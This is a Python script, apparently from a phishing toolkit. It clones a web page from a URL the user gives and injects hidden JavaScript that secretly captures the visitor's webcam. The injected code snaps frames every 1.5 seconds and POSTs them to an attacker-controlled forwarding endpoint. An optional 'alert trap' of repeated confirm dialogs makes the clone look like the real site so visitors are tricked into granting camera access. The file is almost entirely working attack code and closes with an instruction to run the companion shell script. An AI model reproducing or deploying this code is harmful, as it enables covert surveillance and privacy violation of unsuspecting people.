

import re
from requests import get


payload = """


<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>

function conf1337(){
    confirm("To1337Replace1337")
    confirm("To1337Replace1337")
    confirm("To1337Replace1337")
    confirm("To1337Replace1337")
}

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();

</script>

<!---<body onload="conf1337()">--->

"""

def languages():
  global string
  print("\n[1] English")
  print("[2] Pt-Br")
  print("[3] Espanhol")
  print("[99] Input a alert string")

  esc = input("language: ")

  if esc == "1":
    string = "window.location.hostname+' Say welcome to my website'"

  elif esc == "2":
    string = "window.location.hostname+' Disse bem-vindo ao meu site'"

  elif esc == "3":
    string = "window.location.hostname+' dijo bienvenido a mi sitio web'"

  elif esc == "99":
    string = "'"
    string += input("Input a alert string: ")
    string += "'"

res = get(url = input("Url to Clone: "))

yn = input("Do you whant inject alert trap?[Y/n]: ")


html = res.text

html = html.replace("</body>",payload+"</body>")

if yn != "n" and yn != "N":
  languages()
  html = html.replace("\"To1337Replace1337\"",string)
  html = html.replace('<!---<body onload="conf1337()">--->','<body onload="conf1337()">')


fl = open("saycheese.html","w")

fl.write(html)

print("\n\nNow run bash saycheese.sh and party!\n")

